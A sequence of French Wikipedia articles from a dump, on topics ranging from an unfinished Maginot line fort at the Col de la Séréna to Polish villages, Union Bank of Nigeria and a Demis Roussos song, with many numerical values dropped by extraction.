Ouvrage de la Séréna

Louvrage de la Séréna, ou du Col-de-la-Séréna, est une fortification faisant partie de la ligne Maginot, située sur la commune de Valdeblore, dans le département des Alpes-Maritimes.
Dans les années 1930, il était prévu d'en faire un petit ouvrage de trois blocs servant d'abri actif, avec pour mission non seulement de protéger une section d'infanterie, mais aussi de défendre le col de la Séréna grâce à son armement. Mais il est resté inachevé : seulement un de ses trois blocs a été construit. Il a servi de simple abri de montagne pour les troupes françaises en 1940.
Description.
L'ouvrage est construit sur le col de la Séréna, à d'altitude. 
Position sur la ligne.
Les fortifications françaises construites le long des frontières orientales de la mer du Nord jusqu'à la mer Méditerranée dans les années 1930, surnommées la « ligne Maginot », étaient organisées en , eux-mêmes subdivisés hiérarchiquement en plusieurs sous-secteurs et quartiers. L'ouvrage de la Séréna se trouvait dans le secteur fortifié des Alpes-Maritimes (SFAM), plus précisément dans le sous-secteur Tinée-Vésubie. Ce sous-secteur bénéficiait du relief montagneux et surtout du rempart constitué par le massif du Mercantour-Argentera, qui était à l'époque essentiellement en territoire italien (jusqu'au traité de Paris de 1947) : si le village d'Isola était déjà français, le site d'Isola 2000 était de l'autre côté de la frontière franco-italienne, cette dernière suivait les gorges de Valabres, puis passait alors au sud du mont Giraud, traversait la forêt du Gasc, remontait jusqu'au contrefort sud du mont Archas, puis passait par le mont Lapassé et la cime du Diable. Comme seulement deux vallées permettent un accès du nord vers le sud, celles de la Tinée et de la Vésubie, le sous-secteur est divisé en deux quartiers, à l'ouest le quartier de Gaudissart (du nom d'un affluent de la Tinée) et à l'est le quartier Tournairet-Vésubie.
Les défenses étaient organisées en profondeur : d'abord la frontière elle-même était surveillée par les points d'appui légers des sections d'éclaireurs-skieurs (les SES, y compris celles détachées des ). Ensuite, un peu plus en retrait, une série d'avant-postes formaient une ligne de défense : chaque avant-poste, tenu par une section de fantassins, est de taille modeste (comme l'avant-poste de Conchetas). Puis encore un peu plus au sud, à environ six kilomètres de la frontière, se trouve la « ligne principale de résistance », composée d'une succession d'ouvrages bétonnés : les plus gros étaient armés avec de l'artillerie et se soutenaient mutuellement en flanquement (dans le sous-secteur ce sont les ouvrages de Rimplas, de Gordolon et de Flaut), avec des abris actifs dans les intervalles (bloquant les cols mineurs). Enfin, encore un peu plus en arrière, étaient implantées les installations de soutien, c'est-à-dire les positions de tir de l'artillerie de position, les postes de commandement, les dépôts de munitions, les casernements, etc.
L'ouvrage de la Séréna aurait dû servir à renforcer la ligne principale de défense de la ligne Maginot, épaulé par le gros ouvrage de Rimplas à à l'ouest et le petit ouvrage du Col-du-Caïre-Gros à plus à l'est.
Souterrains et blocs.
Comme tous les autres ouvrages de la ligne Maginot, celui de la Séréna est conçu pour résister à un bombardement d'obus de gros calibre. Les organes de soutien sont donc aménagés en souterrain, creusés sous plusieurs mètres de roche, tandis que les organes de combat, dispersés en surface sous forme de blocs, sont protégés par d'épais cuirassements en acier et des couches de béton armé. Les installations souterraines abritent un casernement pour l'équipage, un système de ventilation, une cuisine, un poste de secours, des latrines, des lavabos, un petit stock de munitions, un stock de vivres, une usine (mais le petit groupe électrogène n'a pas été installé), ainsi que des réservoirs d'eau.
L'ouvrage devait être en fait un abri-caverne sur lequel devait être greffé un bloc de combat (d'où l'expression d'« abri actif ») : selon les plans il devait y avoir trois blocs en surface, dont deux d'entrée (un seul construit) et une casemate d'infanterie. Le niveau de protection se limite au , soit une dalle d'un mètre et demie d'épaisseur de béton armé, ainsi que des murs d' (pour ceux qui sont exposés), soit de quoi résister à un bombardement allant jusqu'aux obus de .
Armement.
Les mitrailleuses et fusils mitrailleurs de l'ouvrage étaient chacun protégé par une trémie blindée et étanche (pour la protection contre les gaz de combat). Ils tirent la même cartouche de à balle lourde (modèle 1933 D de au lieu de pour la modèle 1929 C).
Les mitrailleuses étaient des MAC modèle 1931 F, montées en jumelage (JM) pour pouvoir tirer alternativement, permettant le refroidissement des tubes. La portée maximale avec cette balle (Vo = 694 m/s) est théoriquement de (sous un angle de 45°, mais la trémie limite le pointage en élévation à 15° en casemate et à 17° dans une cloche GFM), la hausse est graduée jusqu'à et la portée utile est plutôt de . Les chargeurs circulaires pour cette mitrailleuse sont de chacun, avec un stock de pour chaque jumelage. La cadence de tir théorique est de par minute, mais elle est limitée à 450 (tir de barrage, avec trois chargeurs en une minute), 150 (tir de neutralisation et d'interdiction, un chargeur par minute) ou par minute (tir de harcèlement, le tiers d'un chargeur). Le refroidissement des tubes est accéléré par un pulvérisateur à eau ou par immersion dans un bac.
Les fusils mitrailleurs (FM) étaient des MAC modèle 1924/1929 D, dont la portée maximale est de , avec une portée pratique de l'ordre de . L'alimentation du FM se fait par chargeurs droits de , avec un stock de par cloche GFM, par FM de casemate et pour un FM de porte ou de défense intérieure. La cadence de tir maximale est de par minute, mais elle est normalement de par minute.
Histoire.
Les plans de l'ouvrage ont été faits par la chefferie du génie de Nice et proposés à la Commission d'organisation des régions fortifiées (CORF) en 1932 et modifiés en 1933. L'ouvrage fut construit finalement par la main-d'œuvre militaire (MOM), mais si tardivement qu'il restera inachevé. L'aménagement intérieur n'est réalisé que pendant la saison estivale de 1940.
Pendant les combats de juin 1940, l'ouvrage ne servit que d'abri pour les troupes françaises. La garnison française évacue l'ouvrage pendant les premiers jours de juillet, la partie alpine de la ligne Maginot se trouvant intégralement dans les de la zone démilitarisée en avant de la petite zone d'occupation italienne.
L'ouvrage est désormais propriété de Valdeblore. Les fouilles sont toujours visibles, mais le puits du bloc 3 a été grillagé pour des raisons de sécurité et pour éviter les squatteurs.

</doc>
<doc id="9624744" url="https://fr.wikipedia.org/wiki?curid=9624744" title="Leucothée (homonymie)">
Leucothée (homonymie)

Leucothée (, « blanche déesse ») est un nom issu de la mythologie grecque.
Il désigne originellement :
puis, par extension :

</doc>
<doc id="9624746" url="https://fr.wikipedia.org/wiki?curid=9624746" title="Flabellum floridanum">
Flabellum floridanum

Flabellum floridanum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624747" url="https://fr.wikipedia.org/wiki?curid=9624747" title="Claire Prélia">
Claire Prélia

Marie Claire Joséphine Jouve dite Claire Prélia, née à Vierzon le et morte à Paris 7 le , est une actrice française.
Biographie.
Fille d'un constructeur-mécanicien de Vierzon devenu négociant à Paris, Marie-Claire Jouve s'installe avenue des Ternes avec ses parents dans les années 1890. En , au moment de son mariage, elle ne s'est pas encore lancée dans le théâtre.
Bien qu'elle ait remporté un premier prix de comédie au conservatoire Fémina, elle n'obtiendra que des petits rôles sur les scènes de théâtre parisiens qui n'ont pas laissé de traces. Claire Prélia serait sans doute tombée dans l'oubli le plus complet si, à l'âge de 40 ans, elle n'avait pas eu l'opportunité d'obtenir un premier rôle au cinéma dans un film de Marcel L'Herbier sorti en 1919.
C'est grâce à sa fille Marcelle, devenue actrice sous le nom de Marcelle Pradot, qu'elle a rencontré Marcel L'Herbier son futur gendre. Entre 1919 et 1926, elle tournera dans six films sous sa direction et deux autres avec Jaque-Catelain mais toujours sous sa supervision. Elle y jouera exclusivement des rôles de mères et, dans cinq d'entre eux, elle sera d'ailleurs celle de Jaque-Catelain.
L'arrivée du parlant va mettre un terme à la carrière cinématographique de Claire Prélia mais aussi à celle de sa fille dont le dernier film sortira sur les écrans en .

</doc>
<doc id="9624754" url="https://fr.wikipedia.org/wiki?curid=9624754" title="William Conolly">
William Conolly

William Conolly, né le , et mort le , également connu sous le nom de "Speaker Conolly", est un homme politique irlandais, percepteur, avocat et propriétaire terrien.
Carrière.
William Conolly est le fils d'un aubergiste, Patrick Conolly, dont l'auberge est à Ballyshannon, dans le Comté de Donegal. Patrick Conolly est originaire de comté de Monaghan, et un descendant du clan Ó Conghalaigh (un clan du royaume d'Airgíalla). Patrick Conolly s'installe dans le comté de Donegal, et rejoint l'Église anglicane. Il a pour enfants William, Patrick, Hugh, Phelim et Thady. Il économise suffisamment d'argent pour envoyer William à Dublin pour suivre des études de droit. William Conolly a son diplôme d'avocat en 1685, alors âgé de vingt-trois ans.
Il exerce comme avocat à Dublin et en 1694 puis épouse Katherine Conolly, fille du général Sir Albert Conyngham. Bien plus tard, la famille s'installe au château de Slane dans le comté de Meath. Ils n'ont pas d'enfants, et à la mort de Katherine en 1752 les propriétés passent à son neveu William James Conolly, fils de son frère Patrick.
Il fait fortune à partir de transferts de terres, en spéculant sur les confiscations par la Couronne des terres appartenant précédemment à des partisans du roi Jacques II d'Angleterre, dans le sillage de la Glorieuse Révolution et de la guerre williamite en Irlande. Environ acres irlandaises de terres sont confisquées pour être vendues afin de payer les coûts de la guerre (équivalent à acres), soit près de 5 % de la superficie de l'Irlande. Conolly est le plus grand acheteur individuel, en particulier pour l'achat de 3300 acres dans le comté de Meath qui appartenait à Arnold van Keppel.
Il construit la "Castletown House" à Celbridge, dans le comté de Kildare, dont la construction débute en 1722. Sa maison, Dublin, est sur "Capel Street". Il est également à l'origine de la construction de l'ancienne "Customs House" (actuel l'Hôtel Clarence) et des Chambres du Parlement irlandais, premier bâtiment au monde spécialement conçu pour être abriter une chambre bicamérale de parlement.
Conolly est l'un des plus importants « Undertakers », ceux qui s'occupent des affaires gouvernementales dans la Chambre des communes irlandaise. Il est associé au parti Whigs et s'oppose à la faction Brodrick de Cork. Conolly est député de l'arrondissement de Donegal de 1692 à 1703 et ensuite du comté de Londonderry jusqu'à sa mort en 1729. En 1703 et 1713, il est également élu à Newtown Limavady et en 1727 à Ballyshannon, mais choisit à chaque fois de ne pas siéger.
Il est Président ("speaker") de la Chambre des communes irlandaise et commissaire aux revenus de 1715 à sa mort en 1729. Son nom est orthographié « Conolly », plutôt que « Connolly », directement emprunté au nom gaélique « O Conghaile ».
Conolly est réputé pour être l'homme le plus riche en Irlande à la date de sa mort. À cette date, il possède acres qui permettait de lever un revenu brut de par an. À sa mort, l'archevêque estime le revenu de Conolly en 1729 à livres par an. Sa veuve Katherine continue à vivre dans ce style de vie à Castletown jusqu'à sa mort en 1752. Puis leurs domaines passent brièvement à son neveu, William James Conolly, puis à son petit-neveu, le député Thomas Conolly (1738-1803), connu sous le nom « Squire Tom », qui est marié à Lady Louisa Conolly.
Un pub à Celbridge, "The Speaker's Bar", est nommé en sa mémoire. Il y a aussi un pub à Firhouse (Dublin) nommé « The Speaker Conolly » d'après lui.

</doc>
<doc id="9624755" url="https://fr.wikipedia.org/wiki?curid=9624755" title="Mountains May Depart">
Mountains May Depart



</doc>
<doc id="9624757" url="https://fr.wikipedia.org/wiki?curid=9624757" title="Flabellum folkesoni">
Flabellum folkesoni

Flabellum folkesoni est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624763" url="https://fr.wikipedia.org/wiki?curid=9624763" title="Colomé">
Colomé



</doc>
<doc id="9624765" url="https://fr.wikipedia.org/wiki?curid=9624765" title="Flabellum fragile">
Flabellum fragile

Flabellum fragile est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624770" url="https://fr.wikipedia.org/wiki?curid=9624770" title="Manteau de fourrure">
Manteau de fourrure

Un manteau de fourrure est un manteau réalisé à partir de fourrure animale.
Historique.
Durant l'entre deux guerres, Hollywood et ses stars popularisent l'image « glamour » du manteau de fourrure, image qui perdurera jusqu'à nos jours.
Le manteau de fourrure est signe de réussite après la Seconde Guerre mondiale dans une version traditionnelle, souvent en vison : celui-ci marque le statut social du mari. La plupart des grandes maisons de haute couture ont alors leur département « Fourrure ». Le manteau de fourrure reste également présent dans les décennies suivantes sous une forme plus originale.
Dès le milieu des années 1960, Karl Lagerfeld pour Fendi incorpore la fourrure comme une composante principale de ses collections.
De nos jours.
De nos jours, malgré les mouvements anti-fourrures, ce type de manteau est toujours une pièce fréquente dans la garde-robe. La fourrure reste utilisée d'une façon ou d'une autre dans environ trois quarts des défilés. Elle marque un retour, sous diverses formes, dans les ventes de multiples créateurs qui adaptent la fourrure à des lignes plus contemporaines. Mais la contestation se fait entendre, à l'image d'organisations comme PETA, qui année après année marque des points en convainquant nombre de marques ou distributeurs de supprimer la fourrure naturelle de leurs offres. À l'opposé, le lobby de la fourrure tel Saga Furs, principal fournisseur des entreprises de mode, ou la "Fédération internationale du commerce de la fourrure" annoncent le renouveau de cette matière.
Fausse fourrure.
Comme une alternative, la fourrure revêt parfois une version synthétique imitant son origine animale : l'amélioration au cours des années de la qualité de cette imitation rend son usage de plus en plus fréquent, voire respectable. , elle n'est au départ souvent qu'une mauvaise copie et souffre . Mais certaines marques, à l'image de aux États-Unis ou en Angleterre, en font une spécialité et sont reconnues pour cela. Stella McCartney en fait un principe, refusant toute matière d'origine animale pour ses créations, Carine Roitfeld signe un manteau en faux léopard pour Uniqlo. Peu à peu, plus d'une centaine de marques s'engagent à ne plus utiliser de fourrure naturelle auprès de PETA.
 souligne Lagerfeld.
Notes et références.
Références.
Sources.
 

</doc>
<doc id="9624771" url="https://fr.wikipedia.org/wiki?curid=9624771" title="Loiron-Ruillé">
Loiron-Ruillé

Loiron-Ruillé est une commune française située dans le département de la Mayenne en région Pays de la Loire, peuplée de . Elle est créée le par la fusion de deux communes, sous le régime juridique des communes nouvelles. Les communes de Loiron et Ruillé-le-Gravelais deviennent des communes déléguées.
La commune fait partie de la province historique du Maine, et se situe dans le Bas-Maine.
Géographie.
La commune de Loiron-Ruillé se situe dans le département de la Mayenne, en région Pays de la Loire.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Bretagne orientale et méridionale, Pays nantais, Vendée, caractérisée par une faible pluviométrie en été et une bonne insolation. Elle est en outre dans la zone H2b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Laval à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Loiron-Ruillé est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Loiron-Ruillé, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Laval, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Histoire.
Les deux villages sont apparus au .
La première mention de Loiron apparaît vers 1110 dans le cartulaire de Ronceray. Avant le . La seigneurie est un fief de la famille de Mathefelon, rattaché à la châtellenie de Saint-Ouen.
Le village de Ruillé-le-Gravelais apparaît vers 1160 sous la forme de "Parrochia Ruillé". Avant la fin du , la seigneurie passe par l'acquisition à la vicomté de Terchant qui la conserve jusqu'en 1790. La municipalité, constituée en mars 1795, est favorable aux Chouans. Loiron et Ruillé connaissent des troubles pendant la Révolution : les partisans des Chouans y étant majoritaires, les Républicains sont pourchassés.
La commune est créée le par un arrêté préfectoral du , par la fusion de deux communes, sous le régime juridique des communes nouvelles instauré par la loi du de réforme des collectivités territoriales. Les communes de Loiron et Ruillé-le-Gravelais deviennent des communes déléguées et Loiron est le chef-lieu de la commune nouvelle.
Politique et administration.
Jusqu'aux élections municipales de 2020, le conseil municipal de la nouvelle commune est constitué de l'ensemble des conseillers municipaux des anciennes communes. Un nouveau maire est élu début 2016. Les maires des communes déléguées deviennent maires délégués.
Population et société.
Manifestations culturelles et festivités.
Depuis 1963, la fête des Blés d'or a lieu le troisième dimanche du mois de juillet.
Activité et manifestations.
Marché hebdomadaire le samedi matin.
Culture locale et patrimoine.
Patrimoine naturel.
La commune compte deux chemins de randonnée.

</doc>
<doc id="9624773" url="https://fr.wikipedia.org/wiki?curid=9624773" title="Mémoire exosomatique">
Mémoire exosomatique

La mémoire exosomatique est l'enregistrement de souvenirs en dehors du cerveau. Les premières formes de - griffures symboliques sur os - semblent être des marques de mémoire exosomatique. Toutefois, c'est l'invention de l'écriture qui a permis aux souvenirs complexes d'être enregistrés.
Un sens plus étroit de la mémoire exosomatique est un système d'information qui assure l'interface directement avec le cerveau et fonctionne comme une extension de la mémoire de l'utilisateur. Ces systèmes ont été utilisés comme dispositif narratif dans de nombreuses histoires de science-fiction, en particulier dans le genre cyberpunk. Plus récemment, comme les connaissances scientifiques de la neurologie s'améliorent, certains comme l'informaticien Gregory B. Newby suggèrent qu'un tel dispositif est possible.

</doc>
<doc id="9624783" url="https://fr.wikipedia.org/wiki?curid=9624783" title="Łuszczów Pierwszy">
Łuszczów Pierwszy

Łuszczów Pierwszy (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Situation.
Il se situe à environ à l'est de Jakubowice Murowane (siège de la gmina) et au nord-est de Lublin (siège du powiat et capitale de la voïvodie).
Démographie.
Le village comptait approximativement une population de 881 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624785" url="https://fr.wikipedia.org/wiki?curid=9624785" title="Łysaków (Lublin)">
Łysaków (Lublin)

Łysaków (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Il se situe à environ au nord-est de Jakubowice Murowane (siège de la "gmina") et au nord-est de Lublin (siège du "powiat" et capitale de la voïvodie).
Le village comptait approximativement une population de 349 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624788" url="https://fr.wikipedia.org/wiki?curid=9624788" title="Łysaków">
Łysaków

Łysaków peut faire référence à :
Toponymie.
en Pologne :

</doc>
<doc id="9624790" url="https://fr.wikipedia.org/wiki?curid=9624790" title="Marie-Christine Rixte">
Marie-Christine Rixte

Maria-Cristina Coste-Rixte, née le à Valréas et morte le à Nyons, est une enseignante française, et traductrice en français, anglais et occitan.
Biographie.
Agrégée d’anglais, elle était membre de la section drômoise de l’Institut d’Études Occitanes, de l’Association Internationale d’Études Occitanes (AIEO) et du Pen Club de lenga d’òc.
Elle a également été tambourinaire.
Elle était l’épouse de Jean-Claude Rixte. À sa retraite, elle résidait à Taulignan dans le département français de la Drôme, où elle décéda le 28 août 2019.
Activité professionnelle.
Elle a notamment traduit de l’anglais vers l’occitan une sélection de poèmes du Prix Nobel de Littérature Seamus Heaney, et vers l’anglais un recueil de poèmes de Robert Lafont, "La gacha a la cisterna". De plus, elle a traduit en version provençale le roman de Nicole Faucon-Pellet, "Le secret de la rabassière" (Prix Louis Malassis, 2009), de même qu'elle a publié une critique du célèbre roman "Ulysse" de James Joyce. Par ailleurs, elle a traduit du provençal vers le français la correspondance d'Alfred Bonnefoy-Debaïs, félibre de Séderon, en particulier celle adressée aux félibres de son temps Maurice-Louis Faure, Batisto Bonnet, Joseph Loubet et surtout Frédéric Mistral.
Elle assuma une activité éditoriale et participa à des conférences sur la traduction des textes littéraires occitans en anglais.

</doc>
<doc id="9624791" url="https://fr.wikipedia.org/wiki?curid=9624791" title="Pliszczyn">
Pliszczyn

Pliszczyn (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Il se situe à environ au nord-est de Lublin (siège du powiat et capitale de la voïvodie).
Le village comptait approximativement une population de 489 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624798" url="https://fr.wikipedia.org/wiki?curid=9624798" title="Rudnik (Lublin)">
Rudnik (Lublin)

Rudnik (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Le village comptait approximativement une population de 474 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624799" url="https://fr.wikipedia.org/wiki?curid=9624799" title="On écrit sur les murs">
On écrit sur les murs

On écrit sur les murs est une chanson du chanteur grec Demis Roussos, parue sur l'album "Voice and Vision". Elle est composée par Romano Musumarra sur des paroles de Jean-Marie Moreau. Elle est sortie en décembre 1989 en tant que deuxième single de l'album.
La chanson connaît le succès en France où elle atteint la quatrième place et est certifiée disque d'or par le Syndicat national de l'édition phonographique avec plus de exemplaires écoulés. "On écrit sur les murs" est notamment repris par Kids United sur l'album "Un monde meilleur" en 2015, cette version rencontre également le succès.
Accueil critique.
Elia Habib, un expert du Top 50, donne une critique positive sur la chanson, déclarant que Romano Musumarra ; il ajoute également à propos des paroles, , ce dernier étant interprété par une chorale qui interprète .
Accueil commercial.
"On écrit sur les murs" peut être considéré comme un succès inattendu, ayant débuté à la place du Top 50 le 20 janvier 1990. Il a ensuite grimpé régulièrement et a atteint la quatrième place, en y restant pendant deux semaines non consécutives. Il est resté onze semaines au total dans les dix premières places du classement, et a quitté le Top 50 directement à partir de la place, après 23 semaines de présence. Dans l'Eurochart Hot 100, le single a débuté à la place le 3 mars 1990 et a atteint deux fois la position, lors des cinquième et onzième semaines avec 19 semaines de présence au total dans le classement.
Crédits.
Enregistré au studio Marcadet, Paris, juillet 1989.
Autres reprises.
La chanteuse Nicole Hohloch en a fait une reprise en allemand intitulée "Jeder Zaun, jede Mauer wird aus Blumen sein" en 1992.
La chanson est reprise en 2007 par le groupe Worlds Apart. En 2008, elle fait partie d'un tableau musical lors d'un concert des Enfoirés, les principaux interprètes sont Bénabar et Maxime Le Forestier, accompagnés de Francis Cabrel, Gérald de Palmas, Patrick Fiori, Garou, Elsa, David Hallyday, Catherine Lara et Christophe Maé.
En , "On écrit sur les murs" est reprise par le groupe québécois RAFFY. Cette version devient la chanson-thème de la Fondation Véro et Louis (fondée par Véronique Cloutier et Louis Morissette), et une partie des profits récoltés par la vente du titre seront reversés à cette nouvelle association conçue pour répondre aux besoins des adultes autistes au Québec. Le titre remporte tout de suite un gros succès en occupant la première place des ventes iTunes pendant plusieurs jours.
En 2017, les Enfoirés reprennent une nouvelle fois ce titre, chanté par Tal, Soprano, Grégoire, Amir, Michaël Youn, Lorie Pester, Jeff Panacloc, Liane Foly, Jean-Baptiste Maunier, Bénabar et Claire Keim.

</doc>
<doc id="9624805" url="https://fr.wikipedia.org/wiki?curid=9624805" title="Flabellum galapagense">
Flabellum galapagense

Flabellum galapagense est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624811" url="https://fr.wikipedia.org/wiki?curid=9624811" title="Championnat d'Antigua-et-Barbuda de football 1999-2000">
Championnat d'Antigua-et-Barbuda de football 1999-2000

La saison 1999-2000 du Championnat d'Antigua-et-Barbuda de football est la vingt-neuvième édition de la "Premier Division", le championnat de première division à Antigua-et-Barbuda. Les dix formations de l'élite sont réparties en deux poules, dont les deux premiers jouent la phase finale et le dernier dispute la poule de promotion-relégation.
C'est l'Empire FC, double tenant du titre, qui remporte à nouveau la compétition cette saison après avoir battu English Harbour FC en finale nationale. Il s’agit du douzième titre de champion d'Antigua-et-Barbuda de l'histoire du club.
Compétition.
Le barème de points servant à établir les classements se décompose ainsi :
Première phase.
Chaque équipe rencontre deux fois les formations de sa poule et une fois celles de l'autre poule, soit 13 matchs en tout. Le résultat de la rencontre entre Lion Hill Spliff FC et SAP FC n'est pas connu.
Finale.
Poule de promotion-relégation.
Les derniers de chaque poule retrouvent les et de "First Division" au sein de la poule de promotion-relégation. Seul le premier à l'issue des rencontres accède ou se maintient en "Premier Division".

</doc>
<doc id="9624812" url="https://fr.wikipedia.org/wiki?curid=9624812" title="Hans Freiherr von Boineburg-Lengsfeld">
Hans Freiherr von Boineburg-Lengsfeld



</doc>
<doc id="9624816" url="https://fr.wikipedia.org/wiki?curid=9624816" title="74e brigade de sécurité">
74e brigade de sécurité

La Sicherungs-Brigade 74 ou de sécurité était une brigade des "Sicherungstruppen" allemandes destinée à la répression et à l’anéantissement des maquisards, limousins et auvergnats en particulier, et qui sévit dans ces régions de juin à .
Historique.
La de sécurité ou Sicherungs-Brigade 74 est créée en France à Montargis avec le Sicherungs-Regiment 1000, le Sicherungs-Regiment 1010 et l'Aufklärungs-Abteilung 1000, afin de pouvoir intervenir rapidement contre de potentielles opérations parachutistes alliées sur la région Parisienne. L'unité est rattachée au "Militärbefehlshaber Frankreich"
Le Sicherungs-Regiment 1000 et l'Aufklärungs-Abteilung 1000 seront finalement, inclus dans la brigade de repression du général Jesser et employés pour réprimer et anéantir les groupes de maquisards, en Auvergne et dans le Limousin, de juin à août 1944. Engagé en mai et juin dans la bataille du Mont Mouchet puis en juin-juillet dans la bataille du Mont Gargan, ces deux unités sèment ensuite la terreur dans les environs de Clermont-Ferrand jusqu’à Tulle le long de la route nationale 89, comme à Ussel et Bourg-Lastic.
En , en raison du débarquement de Provence, l'ensemble de la brigade reçoit un ordre de repli immédiat vers l'est.

</doc>
<doc id="9624822" url="https://fr.wikipedia.org/wiki?curid=9624822" title="Union Bank of Nigeria">
Union Bank of Nigeria

Union Bank of Nigeria est une banque commerciale nigériane dont le siège social est situé à Marina, sur l'île de Lagos, à Lagos. Elle opère au Nigéria depuis 1917.
Union Bank est une grande banque commerciale au service des particuliers, des PME, ainsi que des grandes entreprises et organisations. En juillet 2009, elle était classée banque mondiale et banque africaine. Au 31 mars 2018, son actif était estimé à 1 381 milliards de nairas (4,1 milliards de dollars américains).
Histoire.
Elle est créée en 1917 en tant que Colonial Bank. Cette dernière est rachetée par Barclays Bank en 1925. Puis elle est nationalisée partiellement en 1972, avant que Barclays se désengage complètement 1979, avant d'être renommée sous son nom actuel.
En 1993, dans le cadre de sa politique de privatisation et de commercialisation, le gouvernement fédéral a cédé ses parts majoritaires (51,67 %) à des investisseurs privés. Ainsi, Union Bank est devenue entièrement détenue par des citoyens et des organisations nigérians.
À la suite de la crise bancaire de 2009 et à l'intervention de la CBN via l"'Asset Management Company of Nigeria" (AMCON), la banque a été recapitalisée en 2012 grâce à une injection de 500 millions de dollars par "Union Global Partners Limited" (UGPL), un consortium d'investisseurs locaux et internationaux. UGPL a acquis 65 % des parts de la banque et, au dernier trimestre 2014, les 20 % restants d'AMCON ont été acquis par Atlas Mara.
En décembre 2021, la Banque a annoncé avoir reçu notification d'un accord entre UGPL, Atlas Mara Limited et d'autres actionnaires majoritaires concernant la cession de leur participation dans Union Bank à Titan Trust Bank. Les actionnaires majoritaires d'Union Bank ont transféré un total de 93,41 % du capital social émis d'Union Bank à Titan Bank. Après avoir reçu toutes les approbations réglementaires, la transaction a été finalisée en juin 2022, suivie d'un changement de contrôle. Titan Trust Bank est devenue l'actionnaire majoritaire d'Union Bank. ("Titan Trust Bank est détenue majoritairement par TGI Group, un conglomérat nigérian").
L'acquisition des actions a déclenché l'obligation légale et réglementaire pour Titan Trust Bank de lancer une offre publique d'achat obligatoire (OPA) auprès des autres actionnaires d'Union Bank en novembre 2022, puis de procéder à un retrait forcé des actionnaires minoritaires par le biais d'un plan d'arrangement en mai 2023. À la suite de l'acquisition de la totalité des actions d'Union Bank of Nigeria, une demande de radiation des actions d'Union Bank of Nigeria Plc de la Bourse nigériane a été déposée, et la demande a été acceptée en novembre 2023.
À la suite d'une assemblée des actionnaires ordonnée par le tribunal le 28 décembre 2023 et à l'approbation ultérieure du plan, le processus officiel de fusion entre Union Bank of Nigeria et Titan Trust Bank a été conclu, Union Bank of Nigeria devenant l'entité survivante.

</doc>
<doc id="9624823" url="https://fr.wikipedia.org/wiki?curid=9624823" title="Aulhat-Flat">
Aulhat-Flat

Aulhat-Flat est une commune nouvelle située dans le département du Puy-de-Dôme, en région Auvergne-Rhône-Alpes, qui a été créée le .
Géographie.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat de montagne ou de marges de montagne et est dans la région climatique Nord-est du Massif Central, caractérisée par une pluviométrie annuelle de 800 à , bien répartie dans l’année. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Issoire à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
